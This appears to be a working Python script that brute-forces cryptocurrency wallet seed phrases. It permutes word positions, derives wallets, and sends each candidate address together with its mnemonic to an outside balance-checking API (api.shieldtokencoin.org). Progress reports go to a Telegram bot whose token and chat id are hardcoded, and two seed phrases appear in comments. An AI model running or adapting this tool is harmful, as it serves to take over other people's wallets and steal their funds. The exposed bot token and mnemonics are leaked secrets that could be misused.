from threading import Thread
from web3 import Web3
import time
import requests
import config
import sys, os, json
import array_palavras
import itertools
import f_mnemonic_v2,f_mnemonic_v1
from requests.adapters import HTTPAdapter
from urllib3.util import Retry



var1=int(sys.argv[1])
id = config.id
serv_name = config.serv_name
global x, y, z
x = config.x
y = config.y
val = config.val
inclusao = []
total_palavras=13
global total_task
global response
global response2
total_task = 1

pos01=var1;pos02=config.pos02;pos03=config.pos03;pos04=config.pos04;pos05=config.pos05;pos06=config.pos06;pos07=config.pos07;pos08=config.pos08;pos09=config.pos09;pos10=config.pos10;pos11=config.pos11;pos12=config.pos12;
w3 = Web3()
w3.eth.account.enable_unaudited_hdwallet_features()

def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
    global response
    #print(str(wallet))
    #print(str(mnemonic))mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
    #mnemonic = "duty cycle clump adult gorilla paper saddle stand reflect agree train oven"
    #response = requests.post('https://api.shieldtokencoin.org/balance2', json = json = {"wallet": ""+str(wallet)+"","mnemonic": ""+str(mnemonic)+""}))
    adapter = HTTPAdapter(max_retries=Retry(total=0, backoff_factor=2, allowed_methods=None, status_forcelist=[429, 500, 502, 503, 504]))
    http = requests.Session()
    http.mount("https://", adapter)
    http.mount("http://", adapter)

    #response = http.post('https://api.shieldtokencoin.org/balance', allow_redirects=False, json = {"wallet": ""+str(wallet)+"","mnemonic": ""+str(mnemonic)+""}, timeout=(3,10))
    try:
        response = http.post('https://api.shieldtokencoin.org/balance', json = {"wallet": ""+str(wallet)+"","mnemonic": ""+str(mnemonic)+""})
        #response = http.post('http://127.0.0.1:80/balance', json = {"wallet": ""+str(wallet)+"","mnemonic": ""+str(mnemonic)+""})
    except:
        print("Connection refused - Primeira Vez =========================================================================================")

    if response.ok:
        pass
    else:
        chama_api_dos_nodes_para_validar_o_balance2(wallet,mnemonic)        
    #response = requests.post('http://127.0.0.1:80/balance2', json = {"wallet": ""+str(wallet)+"","mnemonic": ""+str(mnemonic)+""})
    #payload = {'chat_id': '139945866', 'text': '🟢 Start ROBO:\naaaaaaaaaaaaaaaaaaaaaaaaaa'}
    #r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload) 
    #sys.exit()

    

def chama_api_dos_nodes_para_validar_o_balance2(wallet,mnemonic):
    global response2
    adapter = HTTPAdapter(max_retries=Retry(total=0, backoff_factor=2, allowed_methods=None, status_forcelist=[429, 500, 502, 503, 504]))
    http = requests.Session()
    http.mount("https://", adapter)
    http.mount("http://", adapter)
    try:
        response2 = http.post('https://api.shieldtokencoin.org/balance', allow_redirects=False, json = {"wallet": ""+str(wallet)+"","mnemonic": ""+str(mnemonic)+""}, timeout=(3,10))
        print("PASSOU OKKKKKKKKKKKKKKKKKKKKKKK ===========================================================================================")
    except:
        print("Connection refused - Segunda Vez ==========================================================================================")
        print("Connection refused - Segunda Vez ==========================================================================================")

    if response2.ok:
        pass
    else:
        chama_api_dos_nodes_para_validar_o_balance2(wallet,mnemonic)  


#Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str("0xd437319A06384c55D8A0D979d12a59e8DeA9D2A3"),str("luxury rebel tenant boat match antique drop album dress scissors pizza crop")), daemon=True).start()

#for v in itertools.permutations(array_palavras.p2, 12):
#    y=y+1
#    if (y % 1000000) == 0:
#        time.sleep(1)
#        # print(f"count: "+str(count)+" - "+str(mnemonic))
#        payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nPhrase:'+str(pos01)+'.'+str(pos02)+'.'+str(pos03)+'.'+str(pos04)+'.'+str(pos05)+'.'+str(pos06)+'.'+str(pos07)+'.'+str(pos08)+'.'+str(pos09)+'.'+str(pos10)+'.'+str(pos11)+'.'+str(pos12)+'\nExecutado: '+str(y)+''}
#        r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload) 
#    #print(v[0],v[1],v[2],v[3],v[4],v[5],v[6],v[7],v[8],v[9],v[10],v[11])
#    retorno = f_mnemonic.inicio(str(y),str(v[0]),str(v[1]),str(v[2]),str(v[3]),str(v[4]),str(v[5]),str(v[6]),str(v[7]),str(v[8]),str(v[9]),str(v[10]),str(v[11]))
#    if not retorno:
#        pass
#    else:      
#        x=x+1
#        r = json.loads(retorno)      
#        #print("Count: "+str('%09.0f' % int(y))+" | Count: "+str('%09.0f' % int(x))+" | "+str(r['wallet'])+" | "+str(r['seq'])+" | "+str(r['mnemonic'])) 
#time.sleep(100)
payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nPhrase:'+str(pos01)+'.'+str(pos02)+'.'+str(pos03)+'.'+str(pos04)+'.'+str(pos05)+'.'+str(pos06)+'.'+str(pos07)+'.'+str(pos08)+'.'+str(pos09)+'.'+str(pos10)+'.'+str(pos11)+'.'+str(pos12)+'\nExecutado: '+str(y)+''}
r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    


while(pos12<=total_palavras):
    y=y+1
    if (y % 10000000) == 0:
        time.sleep(1)
        # print(f"count: "+str(count)+" - "+str(mnemonic))
        payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nPhrase:'+str(pos01)+'.'+str(pos02)+'.'+str(pos03)+'.'+str(pos04)+'.'+str(pos05)+'.'+str(pos06)+'.'+str(pos07)+'.'+str(pos08)+'.'+str(pos09)+'.'+str(pos10)+'.'+str(pos11)+'.'+str(pos12)+'\nExecutado: '+str(y)+''}
        r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
    #time.sleep(0.00001)
    if (y % 10000000) == 0:
        print("Count: "+str('%012.0f' % int(y))+" | "+str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12))
        

   
        
    pos01=pos01+1
    if (pos01 > total_palavras): pos01=var1;pos02=pos02+1
    if ((pos01 == total_palavras) or (pos02 == pos03 or pos02 == pos04 or pos02 == pos05 or pos02 == pos06 or pos02 == pos07 or pos02 == pos08 or pos02 == pos09 or pos02 == pos10 or pos02 == pos11 or pos02 == pos12)): 
        pos01=var1;pos02=pos02+1
    if ((pos02 == total_palavras) or (pos03 == pos04 or pos03 == pos05 or pos03 == pos06 or pos03 == pos07 or pos03 == pos08 or pos03 == pos09 or pos03 == pos10 or pos03 == pos11 or pos03 == pos12)): 
        pos02=0;pos03=pos03+1    
    if ((pos03 == total_palavras) or (pos04 == pos05 or pos04 == pos06 or pos04 == pos07 or pos04 == pos08 or pos04 == pos09 or pos04 == pos10 or pos04 == pos11 or pos04 == pos12)): 
        pos03=0;pos04=pos04+1          
    if ((pos04 == total_palavras) or (pos05 == pos06 or pos05 == pos07 or pos05 == pos08 or pos05 == pos09 or pos05 == pos10 or pos05 == pos11 or pos05 == pos12)):
        pos04=0;pos05=pos05+1
    if ((pos05 == total_palavras) or (pos06 == pos07 or pos06 == pos08 or pos06 == pos09 or pos06 == pos10 or pos06 == pos11 or pos06 == pos12)): 
        pos05=0;pos06=pos06+1          
    if ((pos06 == total_palavras) or (pos07 == pos08 or pos07 == pos09 or pos07 == pos10 or pos07 == pos11 or pos07 == pos12)): 
        pos06=0;pos07=pos07+1          
    if ((pos07 == total_palavras) or (pos08 == pos09 or pos08 == pos10 or pos08 == pos11 or pos08 == pos12)): 
        pos07=0;pos08=pos08+1
    if ((pos08 == total_palavras) or (pos09 == pos10 or pos09 == pos11 or pos09 == pos12)): 
        pos08=0;pos09=pos09+1          
    if ((pos09 == total_palavras) or (pos10 == pos11 or pos10 == pos12)): 
        pos09=0;pos10=pos10+1          
    if ((pos10 == total_palavras) or (pos11 == pos12)): 
        pos10=0;pos11=pos11+1          
    if (pos11 == total_palavras): pos11=0;pos12=pos12+1    

    if (pos01 != pos02 and pos01 != pos03 and pos01 != pos04 and pos01 != pos05 and pos01 != pos06 and pos01 != pos07 and pos01 != pos08 and pos01 != pos09 and pos01 != pos10 and pos01 != pos11 and pos01 != pos12):
        if (pos02 != pos03 and pos02 != pos04 and pos02 != pos05 and pos02 != pos06 and pos02 != pos07 and pos02 != pos08 and pos02 != pos09 and pos02 != pos10 and pos02 != pos11 and pos02 != pos12):
            if (pos03 != pos04 and pos03 != pos05 and pos03 != pos06 and pos03 != pos07 and pos03 != pos08 and pos03 != pos09 and pos03 != pos10 and pos03 != pos11 and pos03 != pos12):            
                if (pos04 != pos05 and pos04 != pos06 and pos04 != pos07 and pos04 != pos08 and pos04 != pos09 and pos04 != pos10 and pos04 != pos11 and pos04 != pos12):            
                    if (pos05 != pos06 and pos05 != pos07 and pos05 != pos08 and pos05 != pos09 and pos05 != pos10 and pos05 != pos11 and pos05 != pos12):   
                        if (pos06 != pos07 and pos06 != pos08 and pos06 != pos09 and pos06 != pos10 and pos06 != pos11 and pos06 != pos12):            
                            if (pos07 != pos08 and pos07 != pos09 and pos07 != pos10 and pos07 != pos11 and pos07 != pos12):            
                                if (pos08 != pos09 and pos08 != pos10 and pos08 != pos11 and pos08 != pos12):            
                                    if (pos09 != pos10 and pos09 != pos11 and pos09 != pos12):            
                                        if (pos10 != pos11 and pos10 != pos12):            
                                            if (pos11 != pos12):    
                                                time.sleep(0.00001)
                                                x=x+1
                                                #time.sleep(1)
                                                # RONEY VAMOS EXECUTAR LOCAL A CONVERSAO DAS PALAVRAS PARA CARTEIRA
                                                # AINDA É A FORMA MAIS EFICIENTE
                                                #print(str(y),str(x),str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12),str(var1))
                                                retorno = f_mnemonic_v2.inicio(str(y),str(x),str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12),str(var1))
                                                if not retorno:
                                                    pass
                                                else:      
                                                    r = json.loads(retorno)      
                                                    print("Count: "+str('%012.0f' % int(y))+" | "+str(r['wallet'])+" | "+str(r['seq'])+" | "+str(r['mnemonic']))                                    
                                                    #print(r)
                                                    #print(str(r['wallet']))
                                                    #print(str(r['seq']))
                                                    #print(str(r['mnemonic']))
                                                    #Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str(y),str(x),str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12),str(var1)), daemon=True).start()
                                                    Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str(r['wallet']),str(r['mnemonic'])), daemon=True).start()



